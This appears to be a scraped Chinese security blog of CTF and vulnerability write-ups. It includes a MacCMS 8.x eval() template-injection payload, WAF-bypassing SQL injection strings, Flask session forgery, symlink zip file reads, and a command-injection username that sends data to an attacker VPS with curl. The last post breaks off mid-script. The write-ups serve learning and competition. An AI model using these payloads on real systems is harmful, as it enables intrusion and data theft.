<p><img src="/.com//2.png" alt="1577415436599"></p>
<p>然后跟进be()</p>
<p><img src="/.com//3.png" alt="1577415497594"></p>
<p>也就是说通过get请求发送$m</p>
<p>再将$m打散成$par</p>
<p>先看$par[0]</p>
<p><img src="/.com//4.png" alt="1577417995966"></p>
<p>我们跟到vod.php然后这个’search’为method之一.看看wd在search中是怎么用的</p>
<p><img src="/.com//5.png" alt="1577418115496"></p>
<p>然后这里的$wd可以通过任何形式的请求获得.</p>
<p>知道了$m的作用,然后我们回到index.php,看看这里是如何解析$wd</p>
<p>跟进到<code>$tpl-&gt;ifex();</code></p>
<p><img src="/.com//6.png" alt="1577419875384"></p>
<p>这里指定一个匹配规则:<strong>{if-([\s\S]<em>?):([\s\S]+?)}([\s\S]</em>?){endif-\1}</strong></p>
<p>$this-&gt;H在vod.php中可以找到:</p>
<p><img src="/.com//7.png" alt="1577420035092"></p>
<p>所以实际上,</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match_all($labelRule,<span class="keyword">$this</span>-&gt;H,$iar);</span><br></pre></td></tr></table></figure>

<p>这段代码是在匹配获得我们输入参数后的html页面的符合匹配规则的字符串放入$iar中.</p>
<p>这里的正则匹配如果看不懂了,建议debug动态调试一下,有助于理解</p>
<p><img src="/.com//8.png" alt="1577435355736"></p>
<p>进入一个for循环</p>
<p><img src="/.com//9.png" alt="1577435470475"></p>
<p>底下的代码可以看到一堆eval()</p>
<p><img src="/.com//11.png" alt="1577435707430"></p>
<p>这个就是漏洞的触发点,要做的就是绕过限制,触发命令执行.</p>
<p>找到912行处,这里对eval的限制最少.</p>
<p><img src="/.com//10.png" alt="1577435634473"></p>
<p>所以最终我们输入的wd参数带有{if-就可以绕过,因为最前面有这么一行代码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!strpos(<span class="string">","</span>.<span class="keyword">$this</span>-&gt;H,<span class="string">"&#123;if-"</span>)) &#123; <span class="keyword">return</span>; &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/.com//12.png" alt="1577436193836"></p>
<p>然后还要满足匹配规则:<strong>{if-([\s\S]<em>?):([\s\S]+?)}([\s\S]</em>?){endif-\1}</strong></p>
<p>所以构造payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span>-A:(phpinfo())&#125;&#123;<span class="keyword">endif</span>-A&#125;</span><br></pre></td></tr></table></figure>



<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个漏洞不难,根据POC,也能很快的分析出来.</p>
<p>就是中间发现原来自己对<strong>preg_match_all()</strong>这个函数的用法一直没有理解通透.</p>
<p><img src="/.com//13.png" alt="1577436696011"></p>
<p>学长和我说正则匹配出的数组中存储的信息,要看它正则表达式是怎么写的:</p>
<p>表达式:<strong>{if-([\s\S]<em>?):([\s\S]+?)}([\s\S]</em>?){endif-\1}</strong></p>
<p>所以他匹配的结果就是一个二维数组$iar</p>
<p>以下是$iar[0]的内容:</p>
<p><img src="/.com//14.png" alt="1577437015203"></p>
<p>这是根据正则规则,匹配出的所有字符串</p>
<p>以下是$iar[2]的内容:</p>
<p><img src="/.com//15.png" alt="1577437094309"></p>
<p>发现没有$iar[2]的内容就是第二个[\s\S]的匹配内容</p>
<p>以下分别是$iar[1]和$iar[3]的内容</p>
<p><img src="/.com//16.png" alt="1577437348282"></p>
<p><img src="/.com//17.png" alt="1577437390748"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/12/27/maccms8-x%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ck8sqr5jt0010kou54yyx2ig0" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-SWPUCTF-web2019" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/12/11/SWPUCTF-web2019/" class="article-date">
  <time datetime="2019-12-11T01:48:37.000Z" itemprop="datePublished">2019-12-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/11/SWPUCTF-web2019/">SWPUCTF-web2019</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>这个比赛没怎么打,比赛为了多拿些分,基本都是在做杂项…..web交给队里的大佬在做(毕竟做web我也帮不上什么忙233333)…..</p>
<p>这个比赛五题杂项,解了四题,题目傻的一批,倒是web解出的人少了很多,学长也是真的厉害…..</p>
<p>swpuCTF复现现场…..</p>
<h1 id="2-复现现场"><a href="#2-复现现场" class="headerlink" title="2.复现现场"></a>2.复现现场</h1><h2 id="2-1web1"><a href="#2-1web1" class="headerlink" title="2.1web1"></a>2.1web1</h2><p><img src="/.com//1.png" alt="1576033916267"></p>
<p>登录后申请一个广告,广告名为<strong>cookie’</strong>,当我们查看广告详情的时候:</p>
<p><img src="/.com//2.png" alt="1576034046630"></p>
<p>报错了,所以这里是存在sql注入的.尝试联合注入,因为我发现<strong>#</strong>,<strong>–+</strong>等关键词被waf掉了.</p>
<p>然后尝试联合注入,这里union,select 是没有被过滤掉的.</p>
<p><img src="/.com//3.png" alt="1576035336522"></p>
<p>然后多次尝试后…</p>
<p><img src="/.com//4.png" alt="1576035492215"></p>
<p>发现字段有22个….然后2,3位可回显</p>
<p><img src="/.com//7.png" alt="1576035649829"></p>
<p>注表名:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=test<span class="string">'/**/union/**/select/**/1,(select/**/group_concat(distinct/**/ table_name)/**/from/**/ mysql.innodb_index_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span><span class="number">22</span>&amp;content=<span class="number">1</span>&amp;ac=add</span><br></pre></td></tr></table></figure>

<p><img src="/.com//5.png" alt="1576036433226"></p>
<p>另外参考学长的payload如下:</p>
<p>用 sys.schema_auto_increment_columns 来注表名</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title=ad<span class="string">'/**/union/**/select/**/1,</span></span><br><span class="line"><span class="string">(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns),3,4,5,6,7,8,9,</span></span><br><span class="line"><span class="string">10,11,12,13,14,15,16,17,18,19,20,21,'</span><span class="number">22</span>&amp;content=<span class="number">1</span>&amp;ac=add</span><br></pre></td></tr></table></figure>



<p>但是无法得到列名,因为information被waf了,然后这里学到一个新技巧:<strong>无列名注入的方法</strong></p>
<p>payload如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title=ad<span class="string">'/**/union/**/select/**/1,</span></span><br><span class="line"><span class="string">(select/**/a.3/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a/**/limit/*</span></span><br><span class="line"><span class="string">*/1,1),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,1,'</span><span class="number">1</span>&amp;content=<span class="number">1</span>&amp;ac=add</span><br></pre></td></tr></table></figure>



<p><img src="/.com//6.png" alt="1576037269366"></p>
<h2 id="2-2web3"><a href="#2-2web3" class="headerlink" title="2.2web3"></a>2.2web3</h2><p>考察python的secret-key泄露</p>
<p>打开题目是一个登录框,随便弄个用户名登录后,burp抓包看到一个session</p>
<p>对此session进行解密<br><img src="/.com//10.png" alt="1576132809834"></p>
<p>然后把100修改成1 ,进行加密试试,但是加密需要secret-key</p>
<p>根据提示</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="number">404</span> not found</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<p>访问一个不存在的页面试试,返回一个token:U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg==</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY:keyqqqwwweee!@<span class="comment">#$%^&amp;*</span></span><br></pre></td></tr></table></figure>

<p>对此进行加密</p>
<p><img src="/.com//10.png" alt="1576133030207"></p>
<p>伪造session越权.</p>
<p><img src="/.com//11.png" alt></p>
<p>在注释里获得源码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/upload',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'id'</span>] != <span class="string">b'1'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(temp)</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">'POST'</span>:</span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        name = session[<span class="string">'password'</span>]</span><br><span class="line">        name = name+<span class="string">'qweqweqwe'</span></span><br><span class="line">        name = name.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        m.update(name)</span><br><span class="line">        md5_one= m.hexdigest()</span><br><span class="line">        n = hashlib.md5()</span><br><span class="line">        ip = request.remote_addr</span><br><span class="line">        ip = ip.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        n.update(ip)</span><br><span class="line">        md5_ip = n.hexdigest()</span><br><span class="line">        f=request.files[<span class="string">'file'</span>]</span><br><span class="line">        basepath=os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        path = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span>+md5_one+<span class="string">'/'</span>+session[<span class="string">'username'</span>]+<span class="string">"/"</span></span><br><span class="line">        path_base = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span></span><br><span class="line">        filename = f.filename</span><br><span class="line">        pathname = path+filename</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"zip"</span> != filename.split(<span class="string">'.'</span>)[<span class="number">-1</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'zip only allowed'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path_base):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path_base)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pathname):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f.save(pathname)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = <span class="string">"unzip -n -d "</span>+path+<span class="string">" "</span>+ pathname</span><br><span class="line">            <span class="keyword">if</span> cmd.find(<span class="string">'|'</span>) != <span class="number">-1</span> <span class="keyword">or</span> cmd.find(<span class="string">';'</span>) != <span class="number">-1</span>:</span><br><span class="line">				waf()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">            os.system(cmd)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        unzip_file = zipfile.ZipFile(pathname,<span class="string">'r'</span>)</span><br><span class="line">        unzip_filename = unzip_file.namelist()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">'is_login'</span>] != <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'not login'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> unzip_filename.find(<span class="string">'/'</span>) != <span class="number">-1</span>:</span><br><span class="line">                shutil.rmtree(path_base)</span><br><span class="line">                os.mkdir(path_base)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">            image = open(path+unzip_filename, <span class="string">"rb"</span>).read()</span><br><span class="line">            resp = make_response(image)</span><br><span class="line">            resp.headers[<span class="string">'Content-Type'</span>] = <span class="string">'image/png'</span></span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            shutil.rmtree(path_base)</span><br><span class="line">            os.mkdir(path_base)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'upload.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/showflag')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showflag</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span> == <span class="literal">False</span>:</span><br><span class="line">        image = open(os.path.join(<span class="string">'./flag/flag.jpg'</span>), <span class="string">"rb"</span>).read()</span><br><span class="line">        resp = make_response(image)</span><br><span class="line">        resp.headers[<span class="string">'Content-Type'</span>] = <span class="string">'image/png'</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"can't give you"</span></span><br></pre></td></tr></table></figure>

<p>源码的意思差不多就是我们上传一个zip包然后会后台解zip包读取zip包中的内容,我们上传软链接压缩包</p>
<p>关于软链接的知识:<a href="https://blog.csdn.net/m290345792/article/details/78518360" target="_blank" rel="noopener"><a href="https://blog.csdn.net/m290345792/article/details/78518360" target="_blank" rel="noopener">https://blog.csdn.net/m290345792/article/details/78518360</a></a></p>
<p>看代码可以猜测flag在./flag/flag.jpg,但是我们并不知道正确的文件位置,在 linux 中, /proc/self/cwd/ 会指向进程的当前目目录.所以使用/proc/self/cwd/flag/flag.jpg来代替真正的文件位置.</p>
<p>创建软链接压缩包:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /proc/<span class="keyword">self</span>/cwd/flag/flag.jpg qwe</span><br><span class="line">zip -ry qwe.zip qwe</span><br></pre></td></tr></table></figure>

<p>上传软链接压缩包,并且将session改成我们伪造的session.</p>
<p><img src="/.com//14.png" alt="1576205724920"></p>
<p>预期解中还有一个解法:</p>
<p>在 linux 中, /proc/self/environ 文文件里里里包含了了进程的环境变量量,可以从中获取 flask 应用用的绝对路路径,再通过绝对路路径制作软链接来读取 flag.jpg (PS:在浏览器器中,我们无无法直接看到 /proc/self/environ 的内容,只需要下载到本地,用用 notepad++打开即可)</p>
<p>命令如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ln -s /proc/<span class="keyword">self</span>/environ qqq</span><br><span class="line">zip -ry qqq.zip qqq</span><br><span class="line">ln -s /ctf/hgfjakshgfuasguiasguiaaui/myflask/flag/flag.jpg www</span><br><span class="line">zip -ry [www.zip](http:<span class="comment">//www.zip) www</span></span><br></pre></td></tr></table></figure>

<p>这个我试了,没有成功</p>
<p><img src="/.com//15.png" alt="1576209377564"></p>
<p>就到这一步了,我没有找到flask的绝对路径</p>
<p>再提供一个非常骚的非预期解</p>
<p>在源码中有这么一段:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">        cmd = <span class="string">"unzip -n -d "</span>+path+<span class="string">" "</span>+ pathname</span><br><span class="line">        <span class="keyword">if</span> cmd.find(<span class="string">'|'</span>) != <span class="number">-1</span> <span class="keyword">or</span> cmd.find(<span class="string">';'</span>) != <span class="number">-1</span>:</span><br><span class="line">waf()</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'error'</span></span><br><span class="line">        os.system(cmd)</span><br></pre></td></tr></table></figure>

<p>其中:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f=request.files[<span class="string">'file'</span>]</span><br><span class="line">basepath=os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">path = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span>+md5_one+<span class="string">'/'</span>+session[<span class="string">'username'</span>]+<span class="string">"/"</span></span><br><span class="line">path_base = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span></span><br><span class="line">filename = f.filename</span><br><span class="line">pathname = path+filename</span><br></pre></td></tr></table></figure>

<p>这里的path是我们可控的,由于session[‘username’]是我们可控的</p>
<p>那我们可以让cmd长成这样:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -n -d + &amp; curl vps:<span class="number">8888</span><span class="comment"># +pathname</span></span><br></pre></td></tr></table></figure>

<p>那么我们在vps上监听8888端口,使用curl就能带出信息,构造用户名为<strong>&amp; curl vps:8888#</strong></p>
<p>附上学长的wp:</p>
<p><img src="/.com//16.png" alt="1576210009908"></p>
<p><img src="/.com//17.png" alt="1576210067933"></p>
<p><img src="/.com//18.png" alt="1576210131779"></p>
<h2 id="2-3web4"><a href="#2-3web4" class="headerlink" title="2.3web4"></a>2.3web4</h2><p>进入靶机后,还是一个登录框.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/12/11/SWPUCTF-web2019/" data-id="ck8sqr5ir000kkou55sip0tc3" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-安询2019-部分crypto-misc" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/12/03/%E5%AE%89%E8%AF%A22019-%E9%83%A8%E5%88%86crypto-misc/" class="article-date">
  <time datetime="2019-12-03T12:58:13.000Z" itemprop="datePublished">2019-12-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/03/%E5%AE%89%E8%AF%A22019-%E9%83%A8%E5%88%86crypto-misc/">安询2019[部分crypto+misc]</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在安询杯中解出的几道题,这里记录一下</p>
<p>然后给自己开一个坑:</p>
<p>(1) thinkphp6 反序列化要学</p>
<p>(2) RSA 还有AES 也要学</p>
<h1 id="1-MISC"><a href="#1-MISC" class="headerlink" title="1.MISC"></a>1.MISC</h1><h2 id="1-1-吹着贝斯扫二维码"><a href="#1-1-吹着贝斯扫二维码" class="headerlink" title="1.1 吹着贝斯扫二维码"></a>1.1 吹着贝斯扫二维码</h2><p>解压后,是一堆二维码的图片</p>
<p>拼图……手动拼图……</p>
<p><img src="/.com//1.png" alt></p>
<p>然后扫描二维码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BASE Family Bucket ??? <span class="number">85</span>-&gt;<span class="number">64</span>-&gt;<span class="number">85</span>-&gt;<span class="number">13</span>-&gt;<span class="number">16</span>-&gt;<span class="number">32</span></span><br></pre></td></tr></table></figure>

<p>在flag.zip的文件中</p>
<p><img src="/.com//2.png" alt="1575119721297"></p>
<p>猜测这是密文.然后上面那个base全家桶是一个加密的过程,这个是密文,顺序倒过来解密</p>
<p><img src="/.com//3.png" alt="1575120123832"></p>
<p>其中13指的是rot13,用脚本解码,脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decoder</span><span class="params">(crypt_str,shift)</span>:</span></span><br><span class="line">    crypt_list = list(crypt_str)</span><br><span class="line">    plain_str = <span class="string">""</span></span><br><span class="line">    num = int(shift)</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> crypt_list:</span><br><span class="line">        ch = ord(ch)</span><br><span class="line">        <span class="keyword">if</span> ord(<span class="string">'a'</span>) &lt;= ch <span class="keyword">and</span> ch &lt;= ord(<span class="string">'z'</span>):</span><br><span class="line">            ch = ch + num</span><br><span class="line">            <span class="keyword">if</span> ch &gt; ord(<span class="string">'z'</span>):</span><br><span class="line">                ch -= <span class="number">26</span></span><br><span class="line">        <span class="keyword">if</span> ord(<span class="string">'A'</span>) &lt;= ch <span class="keyword">and</span> ch &lt;= ord(<span class="string">'Z'</span>):</span><br><span class="line">            ch = ch +num</span><br><span class="line">            <span class="keyword">if</span> ch &gt; ord(<span class="string">'Z'</span>):</span><br><span class="line">                ch -= <span class="number">26</span></span><br><span class="line">        a=chr(ch)</span><br><span class="line">        plain_str += a</span><br><span class="line"></span><br><span class="line">    print(plain_str)</span><br><span class="line"></span><br><span class="line">crypt_str = raw_input(<span class="string">"Crypto_text:"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"!------decode------!"</span></span><br><span class="line">shift=<span class="number">13</span></span><br><span class="line">decoder(crypt_str,shift)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:d]&gt;JA62bf&lt;^o]!;,<span class="keyword">or</span>.=a;i@<span class="number">9</span>/<span class="number">17</span><span class="string">'@8oNU</span></span><br></pre></td></tr></table></figure>

<p>base85解密,不过要用a模式,</p>
<p><img src="/.com//4.png" alt="1575120566058"></p>
<p>ThisIsSecret!233 压缩包密码</p>
<p><img src="/.com//5.png" alt="1575120628566"></p>
<h2 id="1-2-music"><a href="#1-2-music" class="headerlink" title="1.2 music"></a>1.2 music</h2><p>MP3stego这个工具</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Decode.exe -X -P <span class="number">123456</span> <span class="number">3.</span>mp3</span><br></pre></td></tr></table></figure>

<p>然后得到一个txt文件.里面有wav压缩包的解压密码</p>
<p><img src="/.com//6.png" alt></p>
<p>然后使用silenteye解码即可,这个也是在百度的时候发现的,下载地址:<a href="https://silenteye.v1kings.io/" target="_blank" rel="noopener">https://silenteye.v1kings.io/</a></p>
<p>要下载最新版,旧版的无法解密wav文件,参考:<a href="https://blog.csdn.net/vhkjhwbs/article/details/103036133#5%EF%BC%8CSilenteye%EF%BC%88flag.wav%20%3B%C2%A0%20%C2%A0%20%E9%9F%B3%E9%A2%91%E4%B8%AD%E7%9A%84LSB%EF%BC%88%E6%9C%80%E4%BD%8E%E6%9C%89%E6%95%88%E4%BD%8D%EF%BC%89%E9%9A%90%E5%86%99%EF%BC%89" target="_blank" rel="noopener">几道音频misc</a></p>
<p><img src="/.com//7.png" alt></p>
<h2 id="1-3-attack"><a href="#1-3-attack" class="headerlink" title="1.3 attack"></a>1.3 attack</h2><p>流量分析题</p>
<p>分析流量包可以发现这个流量差不多就是去获取那个加密的zip包,把他的数据保存成zip文件,</p>
<p>会是一个加了密的zip包,里面就有flag.txt</p>
<p><img src="/.com//10.png" alt></p>
<p>然后导出这个lsass.dmp</p>
<p><img src="/.com//9.png" alt="1575121255302"></p>
<p>使用工具mimikatz获取administrator的密码,</p>
<p><img src="/.com//13.png" alt="1575126740818"></p>
<p>W3lc0meToD0g3 是压缩包的密码,打开flag.txt</p>
<p>在最底下有flag</p>
<p>参考:<a href="https://www.secpulse.com/archives/2926.html" target="_blank" rel="noopener"><a href="https://www.secpulse.com/archives/2926.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/2926.html</a></a></p>
<h1 id="2-CRYPTO"><a href="#2-CRYPTO" class="headerlink" title="2.CRYPTO"></a>2.CRYPTO</h1><h2 id="2-1-funny-php"><a href="#2-1-funny-php" class="headerlink" title="2.1 funny-php"></a>2.1 funny-php</h2><p><img src="/.com//11.png" alt="1575122137284"></p>
<p>我直接贴exp了,这里有个很好玩的地方就是在加密算法中有这么一段代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($__%<span class="number">100</span>==<span class="number">0</span>)</span><br><span class="line">	$__=base64_encode($__);</span><br></pre></td></tr></table></figure>

<p>这个自己领悟吧…..exp如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$afterbase64=<span class="string">"11444=?&gt;99=&lt;&gt;@??AJIDEJGIIROLLNOPPZ[TUVWWXZZ\]_c"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $_1=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(strlen($str)!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//print($str);</span></span><br><span class="line">        $base64_decode=base64_decode($str);</span><br><span class="line">        <span class="comment">//print(strlen($base64_decode));</span></span><br><span class="line">        <span class="keyword">if</span>(($base64_decode%<span class="number">100</span>==<span class="number">0</span>)&amp;&amp;(strlen($base64_decode)!=<span class="number">0</span>))&#123;</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">"cookie------------"</span>);</span><br><span class="line">            <span class="keyword">print</span>($str);</span><br><span class="line">            <span class="keyword">print</span>($_1);</span><br><span class="line">            $str=$base64_decode;</span><br><span class="line">        &#125;</span><br><span class="line">        $last=substr($str,<span class="number">-1</span>);</span><br><span class="line">        $ord_last=ord($last)-(<span class="number">46</span>-$_1);</span><br><span class="line">        <span class="keyword">print</span>(chr($ord_last));</span><br><span class="line">        